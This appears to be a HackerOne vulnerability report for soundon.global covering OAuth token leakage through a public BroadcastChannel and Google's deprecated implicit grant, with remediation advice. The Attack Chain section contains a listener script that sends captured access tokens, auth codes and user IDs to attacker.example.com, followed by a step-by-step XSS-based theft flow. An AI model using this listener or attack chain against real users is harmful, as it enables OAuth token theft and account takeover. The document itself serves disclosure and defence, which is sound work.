# TK-004: OAuth Access Token Exposure via Public BroadcastChannel + Deprecated Implicit Grant — soundon.global

**Program:** TikTok HackerOne  
**Asset:** `www.soundon.global` / `*.soundon.global` [Critical, Eligible]  
**Severity:** Medium → High  
**CVSS:** 6.5 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N) — upgrades to HIGH if XSS confirmed  
**CWE:** CWE-359 — Exposure of Private Personal Information  
**CWE:** CWE-319 — Cleartext Transmission of Sensitive Information  
**CWE:** CWE-200 — Exposure of Sensitive Information  
**Discovered:** 2026-06-29  
**Status:** Ready to submit

---

## Summary

Two inter-related design flaws in soundon.global's OAuth implementation enable OAuth access token exposure:

1. **Public BroadcastChannel for OAuth tokens**: After any Google or TikTok login, the OAuth callback page broadcasts the access_token, authorization code, and user ID to ALL same-origin tabs via a `BroadcastChannel` whose name (`"bc_channel_third_oauth"`) is hardcoded and publicly disclosed in the production JavaScript bundle.

2. **Deprecated OAuth Implicit Grant for Google login**: The Google OAuth flow uses `response_type=id_token token`, placing the Google access_token directly in the URL fragment (`#access_token=...`). The OAuth 2.0 Security Best Current Practice (RFC 9700) explicitly deprecates implicit grants due to token leakage risk.

Combined: any page on `www.soundon.global` that executes attacker-controlled JavaScript (via XSS, subdomain compromise, or other vectors) can silently capture the OAuth tokens of any user who subsequently authenticates in any other tab.

---

## Evidence

### Issue 1: BroadcastChannel Name Exposed in Production Bundle

**Source:** `sf-fe.anotecdn.com/obj/anote-fe/soundon/client-home/static/js/main.95b13d81.js`

```javascript
// Constants module (extracted from production bundle):
const a = 5049,
      n = 10001403,
      o = "https://www.soundon.global",
      s = "x-csrf-token",
      r = "csrf_token",
      l = "awcdygtcjh22v33k",    // TikTok client_key
      c = 200205,
      d = 1520,
      p = "bc_channel_third_oauth";  // ← PUBLIC BroadcastChannel name

// Export: yW:()=>p  (used as Re.yW in the OAuth callback)
```

**OAuth callback code (production bundle, OAuth callback component):**

```javascript
// After receiving OAuth response in URL hash/params:
let i = e.get("code"),           // auth code (TikTok)
    n = e.get("access_token"),   // access_token (Google implicit)
    o = e.get("id_token"),       // Google id_token

// Parse OAuth state (from URL param):
const {redirectURI:A, nextPath:u, platform:p, region:g, actionType:h, nonce:m} = 
    JSON.parse(decodeURIComponent(decodeURIComponent(a)));

// Broadcast to ALL www.soundon.global tabs:
new BroadcastChannel("bc_channel_third_oauth").postMessage(JSON.stringify({
    access_token: n,   // ← Google access_token (from URL fragment!)
    code: i,           // ← TikTok auth code
    redirectURI: A,    // Redirect URI
    nextPath: u,       // Next page path
    platform: p,       // "google" or "tiktok"
    region: g,
    actionType: h,
    unionId: d         // ← User's platform ID
}));

// Also stored in sessionStorage (secondary leak):
sessionStorage.setItem("ThirdAuthInfo", JSON.stringify({
    code: i,
    access_token: n,
    platform: p,
    unionId: d
    // ...
}));
```

### Issue 2: Google Login Uses Deprecated Implicit Grant

**Source:** Same production bundle — Google OAuth URL construction:

```javascript
const o = new URL("https://accounts.google.com/o/oauth2/v2/auth");
o.searchParams.set("client_id", googleClientId);
o.searchParams.set("redirect_uri", `${window.origin}/oauth/callback`);
o.searchParams.set("response_type", "id_token token");  // ← IMPLICIT GRANT (deprecated)
o.searchParams.set("scope", ["openid", "profile", "email"].join(" "));
o.searchParams.set("state", d);      // Encoded JSON with nextPath/redirectURI
o.searchParams.set("nonce", crypto_random_nonce);
```

Contrast with TikTok's flow (which correctly uses authorization code):
```javascript
// TikTok uses response_type=code (correct, secure):
`https://www.tiktok.com/v2/auth/authorize/?client_key=awcdygtcjh22v33k
  &scope=user.info.basic,...
  &response_type=code    ← Authorization code flow (secure)
  &redirect_uri=${redirectURI}
  &state=${stateJSON}`
```

---

## Attack Chain

### Prerequisite: JavaScript Execution on www.soundon.global

The BroadcastChannel API is same-origin scoped (`https://www.soundon.global`). An attacker who can execute JavaScript on any `www.soundon.global` page can subscribe to the OAuth token channel:

```javascript
// Attacker's listener (runs on any www.soundon.global tab):
new BroadcastChannel("bc_channel_third_oauth").onmessage = (e) => {
    const data = JSON.parse(e.data);
    // Send to attacker's server:
    navigator.sendBeacon(
        "https://attacker.example.com/steal",
        JSON.stringify({
            token: data.access_token,   // Google access token
            code: data.code,            // TikTok auth code
            userId: data.unionId        // Victim's SoundOn user ID
        })
    );
};
```

### Attack Vectors for JavaScript Execution on www.soundon.global

1. **Reflected XSS** in any URL parameter rendered without sanitization
2. **Stored XSS** if any artist profile field (bio, name, track description) is rendered unsanitized
3. **DOM-based XSS** via hash or search parameters
4. **Subdomain/path confusion** (e.g., if `www.soundon.global/public/` serves user-uploaded content with MIME `text/html`)

### Full Attack Flow (after finding XSS)

```
Step 1: Victim clicks malicious link:
  https://www.soundon.global/[xss_vector]?payload=<xss_code>

Step 2: XSS code runs in victim's tab on www.soundon.global:
  new BroadcastChannel("bc_channel_third_oauth").onmessage = steal;

Step 3: Victim opens soundon.global in another tab and clicks "Login with Google"

Step 4: Google OAuth callback returns to:
  https://www.soundon.global/oauth/callback#access_token=ya29.xxx&id_token=eyJ...

Step 5: Callback page broadcasts to bc_channel_third_oauth channel

Step 6: XSS tab's listener receives the broadcast, exfiltrates to attacker.com

Step 7: Attacker now has Google access_token with openid+profile+email scopes
  → Access to victim's name, email, profile picture
  → The token is also used by soundon.global for internal API calls
  → Attacker can make authenticated SoundOn API requests as the victim
```

---

## Standalone Risk: Google Implicit Grant Deprecation

Regardless of BroadcastChannel, using `response_type=id_token token` (implicit grant) is independently problematic:

| Risk | Description |
|------|-------------|
| Token in URL fragment | `#access_token=ya29.xxx` visible in browser address bar, history, server logs |
| No sender authentication | Implicit tokens cannot be verified for origin by the resource server |
| RFC 9700 violation | OAuth 2.0 Security BCP explicitly prohibits implicit grant for new applications |
| Token expiry confusion | Implicit tokens have no refresh mechanism; the app must re-authenticate silently |
| JavaScript exposure | The access_token in `window.location.hash` is accessible to any same-page JS |

---

## Proof of Concept

### Step 1: Confirm BroadcastChannel Name (Static, No Live Traffic)

```bash
curl -s "https://sf-fe.anotecdn.com/obj/anote-fe/soundon/client-home/static/js/main.95b13d81.js" | \
  grep -o '"bc_channel_third_oauth"'
# Output: "bc_channel_third_oauth"
```

### Step 2: Manual Validation (with test account — no XSS needed for researcher)

Open two tabs on www.soundon.global.

**Tab 1 (any soundon.global page) — paste in console:**
```javascript
const ch = new BroadcastChannel("bc_channel_third_oauth");
ch.onmessage = (e) => {
    console.log("=== OAuth Token Received ===");
    console.log(JSON.parse(e.data));
};
console.log("Listening on bc_channel_third_oauth...");
```

**Tab 2:** Click "Login with Google" and complete authentication.

**Expected result:** Tab 1 console displays the access_token, auth code, and user ID from Tab 2's authentication without any interaction.

---

## Impact

| Scenario | Data Exposed | Severity |
|----------|-------------|---------|
| XSS + BroadcastChannel | Google access_token, TikTok auth code, user ID | HIGH 7.5 |
| Implicit grant token in URL | access_token in browser history/logs | MEDIUM 5.3 |
| Channel name public in bundle | Enables zero-guessing exploitation | INFO (amplifier) |
| Combined (XSS + implicit + BC) | Full account takeover via Google token | HIGH 8.1 |

---

## Remediation

### Priority 1: Replace Implicit Grant with Authorization Code + PKCE for Google

```javascript
// Current (insecure — implicit):
o.searchParams.set("response_type", "id_token token");

// Recommended (secure — PKCE):
o.searchParams.set("response_type", "code");
o.searchParams.set("code_challenge", pkce_challenge);
o.searchParams.set("code_challenge_method", "S256");
// Exchange code server-side, never expose access_token to frontend
```

### Priority 2: Remove Access Token from BroadcastChannel Message

```javascript
// Current (exposes access_token):
new BroadcastChannel("bc_channel_third_oauth").postMessage(JSON.stringify({
    access_token: n,  // ← REMOVE
    code: i,
    // ...
}));

// Recommended: Use only opaque session reference, never the raw token
new BroadcastChannel("bc_channel_third_oauth").postMessage(JSON.stringify({
    session_ready: true,  // Signal only
    platform: p,
    // No tokens in the message
}));
```

### Priority 3: Rotate BroadcastChannel Name Per Session

Using a static, publicly-known channel name allows any same-origin script to pre-subscribe. Generate the channel name from the session nonce:

```javascript
const channelName = `oauth_${sessionStorage.getItem("oauth_nonce")}`;
new BroadcastChannel(channelName).postMessage(...);
```

### Priority 4: Audit XSS Vectors on www.soundon.global

Since the BroadcastChannel attack requires same-origin code execution, auditing for XSS in artist profiles, track descriptions, and URL parameters is critical.

---

## References

- OAuth 2.0 Security BCP (RFC 9700): §2.1.2 — Implicit Grant: "Clients MUST NOT use the implicit grant"
- OAuth 2.0 BCP §4.3.2 — Access Token in Browser History: "Access tokens MUST NOT be transmitted via the fragment identifier"
- CWE-359: Exposure of Private Personal Information
- soundon.global added to TikTok HackerOne scope: June 8, 2026 (0 prior reports)
- Production bundle: `sf-fe.anotecdn.com/obj/anote-fe/soundon/client-home/static/js/main.95b13d81.js`
